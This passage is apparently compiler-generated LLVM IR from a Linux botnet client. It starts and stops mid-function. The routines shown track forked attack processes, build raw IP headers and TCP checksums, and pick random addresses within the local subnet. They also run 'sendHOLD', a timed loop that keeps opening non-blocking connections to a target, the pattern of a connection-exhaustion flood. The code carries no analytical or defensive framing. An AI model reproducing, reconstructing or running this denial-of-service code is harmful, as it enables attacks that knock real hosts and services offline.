  br i1 %118, label %119, label %120

119:                                              ; preds = %112
  br label %123

120:                                              ; preds = %112
  %121 = load i32, i32* %18, align 4
  %122 = add nsw i32 %121, 1
  store i32 %122, i32* %18, align 4
  br label %102, !llvm.loop !23

123:                                              ; preds = %119, %102
  %124 = load i8*, i8** %17, align 8
  store i8 0, i8* %124, align 1
  %125 = load i32, i32* %18, align 4
  store i32 %125, i32* %4, align 4
  br label %126

126:                                              ; preds = %123, %110
  %127 = load i32, i32* %4, align 4
  ret i32 %127
}

declare i64 @recv(i32, i8*, i64, i32) #5

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #12
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

8:                                                ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %47

10:                                               ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 1
  store i64 %12, i64* @numpids, align 8
  %13 = load i64, i64* @numpids, align 8
  %14 = add i64 %13, 1
  %15 = mul i64 %14, 4
  %16 = call noalias align 16 i8* @malloc(i64 %15) #12
  %17 = bitcast i8* %16 to i32*
  store i32* %17, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %18

18:                                               ; preds = %34, %10
  %19 = load i32, i32* %4, align 4
  %20 = zext i32 %19 to i64
  %21 = load i64, i64* @numpids, align 8
  %22 = sub i64 %21, 1
  %23 = icmp ult i64 %20, %22
  br i1 %23, label %24, label %37

24:                                               ; preds = %18
  %25 = load i32*, i32** @pids, align 8
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds i32, i32* %25, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32*, i32** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = zext i32 %31 to i64
  %33 = getelementptr inbounds i32, i32* %30, i64 %32
  store i32 %29, i32* %33, align 4
  br label %34

34:                                               ; preds = %24
  %35 = load i32, i32* %4, align 4
  %36 = add i32 %35, 1
  store i32 %36, i32* %4, align 4
  br label %18, !llvm.loop !24

37:                                               ; preds = %18
  %38 = load i32, i32* %2, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i64, i64* @numpids, align 8
  %41 = sub i64 %40, 1
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  %43 = load i32*, i32** @pids, align 8
  %44 = bitcast i32* %43 to i8*
  call void @free(i8* %44) #12
  %45 = load i32*, i32** %3, align 8
  store i32* %45, i32** @pids, align 8
  %46 = load i32, i32* %2, align 4
  store i32 %46, i32* %1, align 4
  br label %47

47:                                               ; preds = %37, %8
  %48 = load i32, i32* %1, align 4
  ret i32 %48
}

; Function Attrs: nounwind
declare i32 @fork() #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @GetRandomIP(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #15
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone willreturn
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local zeroext i16 @csum(i16* %0, i32 %1) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

6:                                                ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

9:                                                ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6, !llvm.loop !25

18:                                               ; preds = %6
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %28

21:                                               ; preds = %18
  %22 = load i16*, i16** %3, align 8
  %23 = bitcast i16* %22 to i8*
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i64
  %26 = load i64, i64* %5, align 8
  %27 = add i64 %26, %25
  store i64 %27, i64* %5, align 8
  br label %28

28:                                               ; preds = %21, %18
  br label %29

29:                                               ; preds = %33, %28
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = icmp ne i64 %31, 0
  br i1 %32, label %33, label %39

33:                                               ; preds = %29
  %34 = load i64, i64* %5, align 8
  %35 = and i64 %34, 65535
  %36 = load i64, i64* %5, align 8
  %37 = lshr i64 %36, 16
  %38 = add i64 %35, %37
  store i64 %38, i64* %5, align 8
  br label %29, !llvm.loop !26

39:                                               ; preds = %29
  %40 = load i64, i64* %5, align 8
  %41 = xor i64 %40, -1
  %42 = trunc i64 %41 to i16
  ret i16 %42
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local zeroext i16 @tcpcsum(%struct.iphdr* %0, %struct.tcphdr* %1) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #15
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias align 16 i8* @malloc(i64 %28) #12
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %32, i8* align 8 %33, i64 24, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %36, i8* align 1 %38, i64 20, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #12
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #9

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @makeIPPacket(%struct.iphdr* %0, i32 %1, i32 %2, i8 zeroext %3, i32 %4) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @sclose(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

6:                                                ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

7:                                                ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

10:                                               ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @socket_connect(i8* %0, i16 zeroext %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %14

13:                                               ; preds = %2
  store i32 0, i32* %3, align 4
  br label %45

14:                                               ; preds = %2
  %15 = load %struct.hostent*, %struct.hostent** %6, align 8
  %16 = getelementptr inbounds %struct.hostent, %struct.hostent* %15, i32 0, i32 4
  %17 = load i8**, i8*** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %21 = bitcast %struct.in_addr* %20 to i8*
  %22 = load %struct.hostent*, %struct.hostent** %6, align 8
  %23 = getelementptr inbounds %struct.hostent, %struct.hostent* %22, i32 0, i32 3
  %24 = load i32, i32* %23, align 4
  %25 = sext i32 %24 to i64
  call void @bcopy(i8* %19, i8* %21, i64 %25) #12
  %26 = load i16, i16* %5, align 2
  %27 = call zeroext i16 @htons(i16 zeroext %26) #15
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call i32 @socket(i32 2, i32 1, i32 6) #12
  store i32 %30, i32* %9, align 4
  %31 = load i32, i32* %9, align 4
  %32 = bitcast i32* %8 to i8*
  %33 = call i32 @setsockopt(i32 %31, i32 6, i32 1, i8* %32, i32 4) #12
  %34 = load i32, i32* %9, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

36:                                               ; preds = %14
  store i32 0, i32* %3, align 4
  br label %45

37:                                               ; preds = %14
  %38 = load i32, i32* %9, align 4
  %39 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %40 = call i32 @connect(i32 %38, %struct.sockaddr* %39, i32 16)
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %42, label %43

42:                                               ; preds = %37
  store i32 0, i32* %3, align 4
  br label %45

43:                                               ; preds = %37
  %44 = load i32, i32* %9, align 4
  store i32 %44, i32* %3, align 4
  br label %45

45:                                               ; preds = %43, %42, %36, %13
  %46 = load i32, i32* %3, align 4
  ret i32 %46
}

declare %struct.hostent* @gethostbyname(i8*) #5

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @sendHOLD(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca %struct.fd_set*, align 8
  %21 = alloca i32, align 4
  %22 = alloca %struct.fd_set*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %23 = call i32 @getdtablesize() #12
  %24 = sdiv i32 %23, 2
  store i32 %24, i32* %7, align 4
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %25, align 4
  %26 = load i32, i32* %5, align 4
  %27 = trunc i32 %26 to i16
  %28 = call zeroext i16 @htons(i16 zeroext %27) #15
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %28, i16* %29, align 2
  %30 = load i8*, i8** %4, align 8
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %32 = call i32 @getHost(i8* %30, %struct.in_addr* %31)
  %33 = icmp ne i32 %32, 0
  br i1 %33, label %34, label %35

34:                                               ; preds = %3
  br label %269

35:                                               ; preds = %3
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %37 = getelementptr inbounds [8 x i8], [8 x i8]* %36, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %37, i8 0, i64 8, i1 false)
  %38 = load i32, i32* %7, align 4
  %39 = zext i32 %38 to i64
  %40 = call i8* @llvm.stacksave()
  store i8* %40, i8** %10, align 8
  %41 = alloca %struct.state_t, i64 %39, align 16
  store i64 %39, i64* %11, align 8
  %42 = bitcast %struct.state_t* %41 to i8*
  %43 = load i32, i32* %7, align 4
  %44 = sext i32 %43 to i64
  %45 = mul i64 %44, 5
  call void @llvm.memset.p0i8.i64(i8* align 16 %42, i8 0, i64 %45, i1 false)
  %46 = call noalias align 16 i8* @malloc(i64 1024) #12
  store i8* %46, i8** %17, align 8
  %47 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %47, i8 0, i64 1024, i1 false)
  %48 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %49 = load i32, i32* %6, align 4
  %50 = add nsw i32 %48, %49
  store i32 %50, i32* %18, align 4
  br label %51

51:                                               ; preds = %266, %35
  %52 = load i32, i32* %18, align 4
  %53 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %54 = icmp sgt i32 %52, %53
  br i1 %54, label %55, label %267

55:                                               ; preds = %51
  store i32 0, i32* %8, align 4
  br label %56

56:                                               ; preds = %263, %55
  %57 = load i32, i32* %8, align 4
  %58 = load i32, i32* %7, align 4
  %59 = icmp slt i32 %57, %58
  br i1 %59, label %60, label %266

60:                                               ; preds = %56
  %61 = load i32, i32* %8, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %62
  %64 = getelementptr inbounds %struct.state_t, %struct.state_t* %63, i32 0, i32 1
  %65 = load i8, i8* %64, align 4
  %66 = zext i8 %65 to i32
  switch i32 %66, label %262 [
    i32 0, label %67
    i32 1, label %111
    i32 2, label %202
  ]

67:                                               ; preds = %60
  %68 = call i32 @socket(i32 2, i32 1, i32 0) #12
  %69 = load i32, i32* %8, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %70
  %72 = getelementptr inbounds %struct.state_t, %struct.state_t* %71, i32 0, i32 0
  store i32 %68, i32* %72, align 8
  %73 = load i32, i32* %8, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %74
  %76 = getelementptr inbounds %struct.state_t, %struct.state_t* %75, i32 0, i32 0
  %77 = load i32, i32* %76, align 8
  %78 = load i32, i32* %8, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %79
  %81 = getelementptr inbounds %struct.state_t, %struct.state_t* %80, i32 0, i32 0
  %82 = load i32, i32* %81, align 8
  %83 = call i32 (i32, i32, ...) @fcntl(i32 %82, i32 3, i8* null)
  %84 = or i32 %83, 2048
  %85 = call i32 (i32, i32, ...) @fcntl(i32 %77, i32 4, i32 %84)
  %86 = load i32, i32* %8, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %87
  %89 = getelementptr inbounds %struct.state_t, %struct.state_t* %88, i32 0, i32 0
  %90 = load i32, i32* %89, align 8
  %91 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %92 = call i32 @connect(i32 %90, %struct.sockaddr* %91, i32 16)
  %93 = icmp ne i32 %92, -1
  br i1 %93, label %98, label %94

94:                                               ; preds = %67
  %95 = call i32* @__errno_location() #15
  %96 = load i32, i32* %95, align 4
  %97 = icmp ne i32 %96, 115
  br i1 %97, label %98, label %105

98:                                               ; preds = %94, %67
  %99 = load i32, i32* %8, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %100
  %102 = getelementptr inbounds %struct.state_t, %struct.state_t* %101, i32 0, i32 0
  %103 = load i32, i32* %102, align 8
  %104 = call i32 @close(i32 %103)
  br label %110

105:                                              ; preds = %94
  %106 = load i32, i32* %8, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %107
  %109 = getelementptr inbounds %struct.state_t, %struct.state_t* %108, i32 0, i32 1
  store i8 1, i8* %109, align 4
  br label %110

110:                                              ; preds = %105, %98
  br label %262

111:                                              ; preds = %60
  br label %112

112:                                              ; preds = %111
  store %struct.fd_set* %12, %struct.fd_set** %20, align 8
  store i32 0, i32* %19, align 4
  br label %113

113:                                              ; preds = %123, %112
  %114 = load i32, i32* %19, align 4
  %115 = zext i32 %114 to i64
  %116 = icmp ult i64 %115, 16
  br i1 %116, label %117, label %126

117:                                              ; preds = %113
  %118 = load %struct.fd_set*, %struct.fd_set** %20, align 8
  %119 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %118, i32 0, i32 0
  %120 = load i32, i32* %19, align 4
  %121 = zext i32 %120 to i64
  %122 = getelementptr inbounds [16 x i64], [16 x i64]* %119, i64 0, i64 %121
  store i64 0, i64* %122, align 8
  br label %123

123:                                              ; preds = %117
  %124 = load i32, i32* %19, align 4
  %125 = add i32 %124, 1
  store i32 %125, i32* %19, align 4
  br label %113, !llvm.loop !27

126:                                              ; preds = %113
  br label %127

127:                                              ; preds = %126
  br label %128

128:                                              ; preds = %127
  %129 = load i32, i32* %8, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %130
  %132 = getelementptr inbounds %struct.state_t, %struct.state_t* %131, i32 0, i32 0
  %133 = load i32, i32* %132, align 8
  %134 = srem i32 %133, 64
  %135 = zext i32 %134 to i64
  %136 = shl i64 1, %135
  %137 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %138 = load i32, i32* %8, align 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %139
  %141 = getelementptr inbounds %struct.state_t, %struct.state_t* %140, i32 0, i32 0
  %142 = load i32, i32* %141, align 8
  %143 = sdiv i32 %142, 64
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds [16 x i64], [16 x i64]* %137, i64 0, i64 %144
  %146 = load i64, i64* %145, align 8
  %147 = or i64 %146, %136
  store i64 %147, i64* %145, align 8
  %148 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %148, align 8
  %149 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 10000, i64* %149, align 8
  %150 = load i32, i32* %8, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %151
  %153 = getelementptr inbounds %struct.state_t, %struct.state_t* %152, i32 0, i32 0
  %154 = load i32, i32* %153, align 8
  %155 = add nsw i32 %154, 1
  %156 = call i32 @select(i32 %155, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %156, i32* %16, align 4
  %157 = load i32, i32* %16, align 4
  %158 = icmp eq i32 %157, 1
  br i1 %158, label %159, label %186

159:                                              ; preds = %128
  store i32 4, i32* %14, align 4
  %160 = load i32, i32* %8, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %161
  %163 = getelementptr inbounds %struct.state_t, %struct.state_t* %162, i32 0, i32 0
  %164 = load i32, i32* %163, align 8
  %165 = bitcast i32* %15 to i8*
  %166 = call i32 @getsockopt(i32 %164, i32 1, i32 4, i8* %165, i32* %14) #12
  %167 = load i32, i32* %15, align 4
  %168 = icmp ne i32 %167, 0
  br i1 %168, label %169, label %180

169:                                              ; preds = %159
  %170 = load i32, i32* %8, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %171
  %173 = getelementptr inbounds %struct.state_t, %struct.state_t* %172, i32 0, i32 0
  %174 = load i32, i32* %173, align 8
  %175 = call i32 @close(i32 %174)
  %176 = load i32, i32* %8, align 4
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %177
  %179 = getelementptr inbounds %struct.state_t, %struct.state_t* %178, i32 0, i32 1
  store i8 0, i8* %179, align 4
  br label %185

180:                                              ; preds = %159
  %181 = load i32, i32* %8, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %182
  %184 = getelementptr inbounds %struct.state_t, %struct.state_t* %183, i32 0, i32 1
  store i8 2, i8* %184, align 4
  br label %185

185:                                              ; preds = %180, %169
  br label %201

186:                                              ; preds = %128
  %187 = load i32, i32* %16, align 4
  %188 = icmp eq i32 %187, -1
  br i1 %188, label %189, label %200

189:                                              ; preds = %186
  %190 = load i32, i32* %8, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %191
  %193 = getelementptr inbounds %struct.state_t, %struct.state_t* %192, i32 0, i32 0
  %194 = load i32, i32* %193, align 8
  %195 = call i32 @close(i32 %194)
  %196 = load i32, i32* %8, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %197
  %199 = getelementptr inbounds %struct.state_t, %struct.state_t* %198, i32 0, i32 1
  store i8 0, i8* %199, align 4
  br label %200

200:                                              ; preds = %189, %186
  br label %201

201:                                              ; preds = %200, %185
  br label %262

202:                                              ; preds = %60
  br label %203

203:                                              ; preds = %202
  store %struct.fd_set* %12, %struct.fd_set** %22, align 8
  store i32 0, i32* %21, align 4
  br label %204

204:                                              ; preds = %214, %203
  %205 = load i32, i32* %21, align 4
  %206 = zext i32 %205 to i64
  %207 = icmp ult i64 %206, 16
  br i1 %207, label %208, label %217

208:                                              ; preds = %204
  %209 = load %struct.fd_set*, %struct.fd_set** %22, align 8
  %210 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %209, i32 0, i32 0
  %211 = load i32, i32* %21, align 4
  %212 = zext i32 %211 to i64
  %213 = getelementptr inbounds [16 x i64], [16 x i64]* %210, i64 0, i64 %212
  store i64 0, i64* %213, align 8
  br label %214

214:                                              ; preds = %208
  %215 = load i32, i32* %21, align 4
  %216 = add i32 %215, 1
  store i32 %216, i32* %21, align 4
  br label %204, !llvm.loop !28

217:                                              ; preds = %204
  br label %218

218:                                              ; preds = %217
  br label %219

219:                                              ; preds = %218
  %220 = load i32, i32* %8, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %221
  %223 = getelementptr inbounds %struct.state_t, %struct.state_t* %222, i32 0, i32 0
  %224 = load i32, i32* %223, align 8
  %225 = srem i32 %224, 64
  %226 = zext i32 %225 to i64
  %227 = shl i64 1, %226
  %228 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %229 = load i32, i32* %8, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %230
  %232 = getelementptr inbounds %struct.state_t, %struct.state_t* %231, i32 0, i32 0
  %233 = load i32, i32* %232, align 8
  %234 = sdiv i32 %233, 64
  %235 = sext i32 %234 to i64
  %236 = getelementptr inbounds [16 x i64], [16 x i64]* %228, i64 0, i64 %235
  %237 = load i64, i64* %236, align 8
  %238 = or i64 %237, %227
  store i64 %238, i64* %236, align 8
  %239 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %239, align 8
  %240 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 10000, i64* %240, align 8
  %241 = load i32, i32* %8, align 4
